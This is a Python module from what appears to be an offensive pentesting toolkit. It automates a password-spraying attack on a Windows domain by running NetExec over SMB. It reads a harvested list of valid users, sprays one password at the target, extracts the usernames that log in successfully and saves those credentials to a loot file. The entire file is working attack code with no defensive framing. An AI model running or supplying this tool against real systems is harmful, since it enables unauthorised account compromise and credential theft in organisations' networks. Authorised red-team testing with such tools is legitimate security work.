# modules/password_spray.py

import os
import shutil
import subprocess
import re
from core.colors import red, green, yellow, blue
from core.helpers import save_loot

def attack_password_spray(session):
    print(blue("[*] Starting Password Spraying Attack (NXC Native + Live Output)..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    loot_users = "loot/valid_users.txt"
    if not os.path.exists(loot_users):
        print(red("[-] valid_users.txt not found. Run 'attack authenum users save' first."))
        return

    password = input("[?] Enter password to spray: ").strip()
    if not password:
        print(red("[-] No password provided. Aborting."))
        return

    with open(loot_users, "r") as f:
        users = [line.strip() for line in f if line.strip()]
    if not users:
        print(red("[-] No users loaded from valid_users.txt"))
        return

    # Step 1: Write to temp user file
    temp_userfile = "loot/spray_users.txt"
    with open(temp_userfile, "w") as f:
        f.writelines([u + "\n" for u in users])

    print(blue(f"[*] Spraying {len(users)} users with password: '{password}'"))

    # Prepare log files
    spray_log_file = "loot/spray_nxc_raw.txt"
    spray_valid_file = "loot/spray_valid.txt"
    os.makedirs("loot", exist_ok=True)
    valid_lines = []

    cmd = [
        "nxc", "smb", session.target_ip,
        "-d", session.domain,
        "-u", temp_userfile,
        "-p", password,
        "--no-bruteforce",
        "--continue-on-success"
    ]

    try:
        with open(spray_log_file, "w") as log_file:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            for line in proc.stdout:
                line = line.strip()
                print(line)
                log_file.write(line + "\n")

                # Match success lines: [+] domain\user:password
                if "[+]" in line and "STATUS_LOGON_FAILURE" not in line:
                    match = re.search(
                        rf"{re.escape(session.domain)}\\([^\s:]+):{re.escape(password)}",
                        line,
                        re.IGNORECASE
                    )
                    if match:
                        user = match.group(1)
                        creds = f"{user}:{password}"
                        print(green(f"[VALID] {creds}"))
                        valid_lines.append(creds)

        if valid_lines:
            save_loot("spray_valid.txt", "\n".join(valid_lines))
            print(green(f"[+] Valid credentials saved to loot/spray_valid.txt"))
        else:
            print(yellow("[*] No valid credentials detected."))

        print(yellow(f"[*] Full spray output saved to loot/spray_nxc_raw.txt"))

    except KeyboardInterrupt:
        print(red("\n[!] Password spray aborted by user."))
    except Exception as e:
        print(red(f"[!] Unexpected error: {e}"))
